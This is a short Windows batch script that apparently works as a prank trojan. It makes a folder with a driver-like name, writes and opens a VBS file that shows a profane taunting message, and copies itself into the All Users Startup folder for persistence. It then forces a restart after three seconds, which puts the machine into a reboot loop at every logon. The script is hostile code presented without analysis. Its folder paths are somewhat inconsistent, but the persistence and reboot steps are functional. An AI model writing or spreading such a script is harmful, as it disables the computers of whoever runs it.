   @echo off
   cls
   If Exist C:\APX~1\Q53As\kern45.vbs goto open
   If Not Exist C:\APX DRIVERS32\Q53As\kern45.vbs goto make

   :make
   md C:\APX_DRIVERS32
   cd c:\APX~1
   md Q53As
   echo MsgBox "U R Screwed MotherFucker" >> C:\APX~1\Q53As\kern45.vbs
   goto open

   :open
   start c:\APX~1\Q53As\kern45.vbs
   Copy %0 c:\Docume~1\Allu~1\Startm~1\StartUp\*.bat
   shutdown -r -t 3 -c "Hahahahahaha"
